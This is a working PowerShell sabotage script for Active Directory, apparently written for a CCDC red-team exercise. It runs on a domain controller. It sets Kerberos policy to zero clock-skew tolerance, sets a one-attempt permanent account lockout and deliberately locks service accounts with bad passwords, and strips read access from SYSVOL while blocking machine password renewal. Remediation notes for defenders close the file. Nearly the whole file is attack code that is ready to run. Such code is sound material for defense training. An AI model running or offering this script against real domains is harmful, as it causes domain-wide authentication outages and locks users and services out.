# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — Active Directory: Kerberos Khaos
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1484.001 (Domain Policy Modification: Group Policy Obj)
#               T1484.002 (Domain Trust Modification)
#               T1222   (File and Directory Permissions Modification)
#               T1531   (Account Access Removal)
#
# Targets: Windows Server 2022 (Domain Controller only)
#
# Description:
#   Phase 2 ServiceSmasher covered LDAP firewall blocking, LDAP MaxConnections
#   policy, and fake SRV records. This script attacks AD at the authentication
#   and directory access layers — different vectors that survive LDAP fixes:
#
#   LAYER 1 — KERBEROS TICKET POLICY WEAPONIZATION
#      - Applied via secedit /configure targeting Default Domain Policy
#          MaxTicketAge      = 1 hour   (secedit hours unit; default 10 hrs)
#          MaxClockSkew      = 0 min    (zero tolerance — any clock drift breaks auth)
#          MaxRenewAge       = 1 day    (secedit days unit; default 7 days)
#          MaxServiceAge     = 10 min   (secedit minutes unit; default 600 min)
#      - Zero clock-skew tolerance is the primary killer: any time difference
#        between scoring server and DC returns KRB_AP_ERR_SKEW immediately
#      - Any network latency or time drift causes immediate authentication failure
#
#   LAYER 2 — ACCOUNT LOCKOUT WEAPONIZATION
#      - Set-ADDefaultDomainPasswordPolicy:
#          LockoutThreshold        = 1        (one bad attempt = locked)
#          LockoutDuration         = -1       (never auto-unlocks)
#          LockoutObservationWindow= 99999min
#      - After policy is set, trigger one failed auth attempt against each
#        known service account (DNS, MSSQL, IIS) to pre-lock them
#      - Blue team must: unlock each account AND fix the lockout policy
#        before any service can authenticate to AD
#
#   LAYER 3 — SYSVOL/NETLOGON ACCESS DESTRUCTION
#      - Remove Authenticated Users:Read and Everyone:Read ACEs from:
#          C:\Windows\SYSVOL\sysvol\<domain>\
#          C:\Windows\SYSVOL\sysvol\<domain>\Policies\
#          C:\Windows\SYSVOL\sysvol\<domain>\scripts\
#      - Without SYSVOL read access: GPOs cannot apply, logon scripts
#        don't run, domain-joined machines report "Group Policy failed"
#      - Set HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\
#        DisablePasswordChange = 1 (prevents machine account password renewal)
#      - Clients cannot renew computer account credentials — eventual auth failure
#
# Key implementation notes:
#   - Requires Active Directory module: Import-Module ActiveDirectory
#   - Script detects AD DS role (NTDS service) before running; skips if not DC
#   - SYSVOL ACL changes via icacls or Set-Acl on the SYSVOL path
#   - Lockout policy changes take effect domain-wide immediately
#   - Kerberos policy changes take effect after existing tickets expire
#   - Document which service accounts exist so pre-locking is targeted
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — Active Directory: Kerberos Khaos"
Write-Warn "================================================================"
Write-Host ""

# ── DC Role Check ──────────────────────────────────────────────────────────
$ntdsSvc = Get-Service -Name "NTDS" -ErrorAction SilentlyContinue
if (-not $ntdsSvc) {
    Write-Err "NTDS service not found — not a Domain Controller. Exiting."
    exit 1
}

Import-Module ActiveDirectory -ErrorAction Stop

$ADDomain      = Get-ADDomain
$DomainDNS     = $ADDomain.DNSRoot
$DomainNetbios = $ADDomain.NetBIOSName
Write-Info "Domain: $DomainDNS ($DomainNetbios)"

# ── LAYER 1: Kerberos Ticket TTL Weaponization (T1484.001) ─────────────────
Write-Section "LAYER 1 — Kerberos Ticket TTL Weaponization"

# Kerberos policy lives in the Default Domain Policy GPO (not in the AD domain
# object). Apply via secedit /configure with a temp INF. Unit reference:
#   MaxTicketAge  = hours   (default 10  → set 1)
#   MaxClockSkew  = minutes (default  5  → set 0  — zero tolerance is the killer)
#   MaxRenewAge   = days    (default  7  → set 1)
#   MaxServiceAge = minutes (default 600 → set 10)
$l1TmpBase = "$env:TEMP\kk_l1_$(Get-Random -Maximum 99999)"
$l1Inf     = "${l1TmpBase}.inf"
$l1Sdb     = "${l1TmpBase}.sdb"

$l1InfLines = @(
    '[Unicode]',
    'Unicode=yes',
    '[Version]',
    'signature="$CHICAGO$"',
    'Revision=1',
    '[Kerberos Policy]',
    'MaxServiceAge = 10',
    'MaxTicketAge = 1',
    'MaxRenewAge = 1',
    'MaxClockSkew = 0',
    'TicketValidateClient = 1'
)
$l1InfLines | Out-File $l1Inf -Encoding Unicode

& secedit.exe /configure /db $l1Sdb /cfg $l1Inf /areas SECURITYPOLICY /overwrite /quiet
if ($LASTEXITCODE -eq 0) {
    Write-Success "Kerberos policy applied via secedit"
    Write-Info   "  MaxTicketAge=1hr  MaxClockSkew=0min  MaxRenewAge=1day"
} else {
    Write-Err "secedit failed (exit $LASTEXITCODE)"
}
Remove-Item $l1Inf, $l1Sdb -Force -ErrorAction SilentlyContinue

& gpupdate.exe /force /quiet 2>$null
if ($LASTEXITCODE -eq 0) {
    Write-Success "gpupdate /force executed"
} else {
    Write-Warn "gpupdate returned exit $LASTEXITCODE — policy may apply on next refresh"
}

# ── LAYER 2: Account Lockout Weaponization (T1484.001 / T1531) ─────────────
Write-Section "LAYER 2 — Account Lockout Weaponization"

# LockoutDuration of TimeSpan::Zero = account never auto-unlocks (admin must act)
try {
    Set-ADDefaultDomainPasswordPolicy -Identity $DomainDNS `
        -LockoutThreshold 1 `
        -LockoutDuration ([System.TimeSpan]::Zero) `
        -LockoutObservationWindow (New-TimeSpan -Minutes 99999)
    Write-Success "Lockout policy: threshold=1, duration=never, window=99999min"
} catch {
    Write-Err "Failed to set lockout policy: $_"
}

# Pre-lock service accounts — threshold is now 1, so one bad attempt locks forever
Add-Type -AssemblyName System.DirectoryServices.AccountManagement

$allEnabled  = Get-ADUser -Filter "Enabled -eq $True" -Properties SamAccountName
$svcAccounts = $allEnabled | Where-Object {
    $n = $_.SamAccountName
    $n -like '*svc*'   -or $n -like '*dns*'   -or $n -like '*sql*' -or
    $n -like '*iis*'   -or $n -like '*mssql*' -or $n -like '*http*'
} | Select-Object -ExpandProperty SamAccountName

if ($svcAccounts) {
    $ctx = $null
    try {
        $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
            [System.DirectoryServices.AccountManagement.ContextType]::Domain,
            $DomainDNS)
    } catch {
        Write-Warn "Could not create domain PrincipalContext: $_"
    }

    foreach ($sam in $svcAccounts) {
        if ($ctx) {
            try {
                $badPwd = "KK_BadPwd_$(Get-Random -Maximum 999999)"
                $null   = $ctx.ValidateCredentials($sam, $badPwd)
                Write-Success "Pre-locked: $sam"
            } catch {
                Write-Warn "Pre-lock attempt for ${sam}: $_"
            }
        } else {
            Write-Warn "Skipped pre-lock for ${sam} (no domain context)"
        }
    }

    if ($ctx) { $ctx.Dispose() }
} else {
    Write-Warn "No service accounts matched naming patterns — skipping pre-lock"
    Write-Info "Policy is live; first bad auth by any svc account will lock it permanently"
}

# ── LAYER 3: SYSVOL/NETLOGON ACL Destruction (T1222 / T1531) ───────────────
Write-Section "LAYER 3 — SYSVOL/NETLOGON ACL Destruction"

$sysvolRoot = "C:\Windows\SYSVOL\sysvol\$DomainDNS"
$aclTargets = @(
    $sysvolRoot,
    "$sysvolRoot\Policies",
    "$sysvolRoot\scripts"
)

foreach ($p in $aclTargets) {
    if (Test-Path $p) {
        & icacls.exe $p /remove "Authenticated Users" /T /C /Q 2>$null
        $rc1 = $LASTEXITCODE
        & icacls.exe $p /remove "Everyone" /T /C /Q 2>$null
        $rc2 = $LASTEXITCODE
        if ($rc1 -eq 0 -and $rc2 -eq 0) {
            Write-Success "Stripped ACEs from: $p"
        } else {
            Write-Warn "icacls partial failure on $p (rc1=$rc1 rc2=$rc2) — some ACEs may remain"
        }
    } else {
        Write-Warn "Path not found (skipped): $p"
    }
}

# Prevent machine accounts from renewing their passwords
$netlogonKey = "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters"
try {
    Set-ItemProperty -Path $netlogonKey -Name "DisablePasswordChange" -Value 1 -Type DWord
    Write-Success "DisablePasswordChange = 1 set in Netlogon\Parameters"
} catch {
    Write-Err "Failed to set DisablePasswordChange: $_"
}

# ── Summary ─────────────────────────────────────────────────────────────────
Write-Host ""
Write-Success "================================================================"
Write-Success " KerberosKhaos complete — all 3 layers applied"
Write-Success "================================================================"
Write-Host ""
Write-Info "Blue team remediation required:"
Write-Info "  L1: Restore Default Domain Policy Kerberos settings"
Write-Info "      (gpmc.msc > Default Domain Policy > Computer Config >"
Write-Info "       Security Settings > Account Policies > Kerberos Policy)"
Write-Info "  L2: Fix lockout policy (threshold, duration) AND manually unlock"
Write-Info "      every locked service account (AD Users and Computers)"
Write-Info "  L3: Restore SYSVOL ACLs (icacls /grant 'Authenticated Users':RX)"
Write-Info "      AND delete DisablePasswordChange from Netlogon\Parameters"
